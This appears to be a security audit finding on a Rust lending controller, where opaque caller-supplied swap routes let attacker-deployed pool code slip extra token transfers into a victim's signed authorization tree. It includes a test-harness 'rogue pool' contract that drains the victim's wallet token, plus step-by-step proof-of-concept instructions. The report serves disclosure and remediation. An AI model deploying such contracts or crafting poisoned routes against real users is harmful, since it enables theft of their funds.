### Title
Caller-controlled swap routes can execute untrusted pool code beneath the caller’s authorization and steal unrelated wallet tokens - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The controller authorizes the caller at the strategy entrypoint, then passes caller-supplied opaque route bytes into the configured router. Because `swap` is not decoded or constrained by the controller, a route can place attacker-controlled venue code on the call stack while the caller’s root authorization remains active. That code can request additional `token.transfer(caller, attacker, amount)` calls, which simulation records beneath the caller’s `swap_collateral` authorization tree. If the caller signs the simulated tree, the malicious venue can transfer unrelated wallet tokens, not merely the swap input.

### Finding Description
`process_swap_collateral` authenticates `caller` and authorizes the account owner or delegate before invoking the route-bearing strategy path. [1](#0-0)  It then withdraws collateral and forwards the caller-supplied `swap` blob through `withdraw_and_swap_from_supply`. [2](#0-1) 

`swap_tokens` treats `swap` only as non-empty opaque data, obtains the configured router, snapshots balances, authorizes one controller-to-router input transfer, and calls `execute_strategy(controller, amount_in, swap)`. [3](#0-2)  The controller validates only controller balance deltas after the router call; it does not decode the route, restrict venue addresses, or limit the set of token contracts invoked below the caller’s authorization. [4](#0-3) 

This creates a trust-boundary escape analogous to the vm2 report: attacker-selected code reached through a seemingly constrained API can cause additional privileged token calls to be attributed to the user’s top-level authorization. The production test double demonstrates that a route-selected contract calling `token.transfer(caller, attacker, amount)` is recorded as a child of the caller’s `swap_collateral` invocation, and signing that generated tree moves the caller’s unrelated token. [5](#0-4) 

The same route sink is reachable through `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral`; `swap_debt` supplies the same caller-controlled bytes to `swap_tokens_or_passthrough`. [6](#0-5) 

### Impact Explanation
A malicious route can steal arbitrary token balances from the victim’s wallet when the victim signs the simulated authorization tree containing the extra transfer. The stolen asset need not be listed by the lending market, and neither the controller’s input-spend check nor its measured-output check bounds this loss because both inspect only the controller’s balances. [4](#0-3)  The harness demonstrates Alice losing her entire unrelated wallet token balance while still receiving a fair swap output and successfully depositing it. [7](#0-6) 

### Likelihood Explanation
An unprivileged attacker can deploy a malicious venue contract and craft route bytes naming that venue and an arbitrary victim token transfer. The attacker then supplies the route to a victim through a malicious interface or transaction payload. Simulation returns an authorization tree containing the extra token transfer, and execution succeeds if the victim signs that tree. [8](#0-7)  The harness confirms that enforcing mode accepts the rogue transfer once the simulated child is included, while an honest root-only tree rejects it. [9](#0-8) 

### Recommendation
Do not allow opaque route data to select arbitrary executable venue contracts under a user’s root authorization. Decode route metadata before execution and restrict venue/pool addresses to an explicitly governed allowlist, or restructure the strategy so the router call cannot add user-authorized token invocations outside a fixed, independently validated authorization manifest. At minimum, make clients reject any simulated authorization tree containing children other than the expected input transfer and document that signing a poisoned tree authorizes unrelated wallet transfers. [10](#0-9) 

### Proof of Concept
1. Attacker deploys a contract exposing the venue function expected by the route. Its function performs `token::Client::new(env, victim_token).transfer(victim, attacker, victim_balance)`. [11](#0-10) 
2. Attacker constructs route bytes naming the malicious contract as a hop while arranging a positive output so the controller’s measured-output check succeeds. [12](#0-11) 
3. Victim calls `Controller.swap_collateral(caller=victim, account_id, current=USDC, from_amount, new=ETH, swap=malicious_route)`. [13](#0-12) 
4. The controller invokes `router.execute_strategy(controller, amount_in, malicious_route)` inside the guarded router call. [14](#0-13) 
5. During simulation, the malicious contract’s `victim_token.transfer(victim, attacker, victim_balance)` appears as a child of the victim’s `swap_collateral` authorization. [15](#0-14) 
6. If the victim signs that simulated tree, the swap deposits valid output while the unrelated wallet token is transferred to the attacker. [7](#0-6)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L27-48)
```rust
pub(crate) fn process_swap_collateral(
    env: &Env,
    caller: &Address,
    params: SwapCollateralParams<'_>,
) {
    let SwapCollateralParams {
        account_id,
        current,
        from_amount,
        new,
        swap,
    } = params;

    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L21-38)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-55)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-46)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
